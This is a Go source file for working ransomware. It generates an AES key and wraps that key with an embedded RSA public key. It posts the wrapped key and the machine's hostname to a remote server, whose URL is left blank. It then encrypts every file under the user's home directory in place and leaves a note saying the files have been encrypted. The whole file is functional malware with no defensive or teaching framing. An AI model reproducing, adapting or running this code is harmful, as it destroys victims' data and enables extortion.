package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"crypto/sha256"
	"encoding/pem"
	"encoding/hex"
	"net/url"
	"fmt"
	"net/http"
	"runtime"
	"io"
	"os"
)

var key []byte
var fileSep string
var serverPub = []byte(`
-----BEGIN PUBLIC KEY-----
MIIBCgKCAQEAzGLShgBYK22Q7L69uu/X9jcoilK2gWloRzpea4boVG+KSKN6KVW9
ZF379B9tkwOEwi3e6fDWEBaykMjgnz6P9agewQnBI7vHu/5mOIlYigwp833hG8wO
dPjd279EnEf8W2GaQbj3sq4pb/TOpuv7mIgtyNUHIqDz1nrZ6JiY9J98A/7lma9L
Zg6clTJZgPKHRxK0QkzUogGnYJWxt/v9wb+sSkWc6O4tOitnsnC+RfcS9xrOAU5r
7qEGpknlVRBqoyDjVbWuSvOgRz1azmkpe4ZgCylTfEB3e1HBKiNq2SJZBFx7ssAG
wcWSZIdi/fsr1khfNoQU429EYmknW5JjFQIDAQAB
-----END PUBLIC KEY-----`)

func main() {

	home, _ := os.UserHomeDir()

	opSystem := runtime.GOOS
	fileSep = "/"
	if opSystem == "windows" {
		fileSep = "\\"
	}

	err := genKey()
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
	hexKey, err := encryptKey()
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
	sendKey(hexKey)
	traverseFiles(home)
}

func genKey() error {
	key = make([]byte, 32)
	_, err := rand.Read(key)
	return err
}

func encryptKey() (string, error) {
	block, _ := pem.Decode(serverPub)
	if block == nil || block.Type != "PUBLIC KEY" {
		fmt.Println("invalid pub key")
		os.Exit(1)
	}
	pub, err := x509.ParsePKCS1PublicKey(block.Bytes)
	if err != nil {
		fmt.Println(err)
		return "", err
	}

	encKey, err := rsa.EncryptOAEP(
		sha256.New(),
		rand.Reader,
		pub,
		key,
		nil)
	if err != nil {
		fmt.Println(err)
		return "", err
	}
	encHex := hex.EncodeToString(encKey)
	return encHex, nil
}


func traverseFiles(path string) {
	var dirs []string

	files, err := os.ReadDir(path)
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	for _, file := range files {
		if file.IsDir() {
			base := path + fileSep + file.Name()
			dirs = append(dirs, base)
			fmt.Println("dir path: ", base)
		} else {
			base := path + fileSep + file.Name()

			fmt.Println("file to enc: ", base)
			encryptFile(base)
		}
	}
	for _, dir := range dirs {
		traverseFiles(dir)
	}
}

func encryptFile(path string) {
	data, err := os.ReadFile(path)
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	c, err := aes.NewCipher(key)
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	gcm, err := cipher.NewGCM(c)
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	nonce := make([]byte, gcm.NonceSize())

	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	enc := gcm.Seal(nonce, nonce, data, nil)
	err = os.WriteFile(path, enc, 0777)
	if err != nil {
		fmt.Println(err)
	}
}

func sendKey(hexKey string) error {
	hostname, err := os.Hostname()
	if err != nil  {
		fmt.Println(err)
		return err
	}

	sum := sha256.Sum256([]byte(hexKey))
	shaSum := fmt.Sprintf("%x", sum)
	resp, err := http.PostForm("https://", url.Values{"hostname": {hostname}, "key": {hexKey}, "sha256sum": {shaSum}})
	if err != nil || resp.StatusCode != 200 {
		fmt.Println(err)
		fmt.Println("HTTP Response: ", resp.StatusCode)
		return err
	}

	n, err := os.Create("note.txt")
	if err != nil {
		fmt.Println(err)
		return err
	}
	defer n.Close()
	home, _ := os.UserHomeDir()
	s := fmt.Sprintf("All files in %s have been encrypted.\nEncrypted key: %s \nSha256Sum: %s", home, hexKey, shaSum)
	_, err = n.WriteString(s)
	if err != nil {
		fmt.Println("Error writing file: ", err)
		return err
	}
	return nil
}

